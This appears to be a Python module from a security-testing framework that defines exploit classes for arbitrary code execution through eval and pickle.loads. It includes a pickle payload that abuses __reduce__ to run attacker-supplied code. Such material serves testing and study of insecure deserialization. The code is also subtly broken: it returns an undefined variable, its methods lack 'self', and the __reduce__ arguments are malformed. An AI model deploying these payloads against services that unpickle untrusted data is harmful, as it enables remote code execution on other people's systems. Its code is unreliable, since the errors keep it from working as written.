import builtins
import pickle
import subprocess
from typing import Callable
from .code_execution import Exploit

class PythonExploit(Exploit):
    category_name = "Python Code Execution"
    def generate_payload(source_code: str) -> str:
        return command


class EvalExploit(PythonExploit):
    vulnerable_function = builtins.eval

    def generate_payload(source_code: str) -> str:
        return source_code

    def run_payload(payload: str) -> None:
        eval(payload)


class PickleLoadsExploit(PythonExploit):
    vulnerable_function = pickle.loads
    source = (
        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
    )

    def generate_payload(source_code: str) -> str:
        class Exploit(object):
            def __reduce__(self):
                return (eval, source_code)

        return pickle.dumps(Exploit())

    def run_payload(payload: str) -> None:
        pickle.loads(payload)
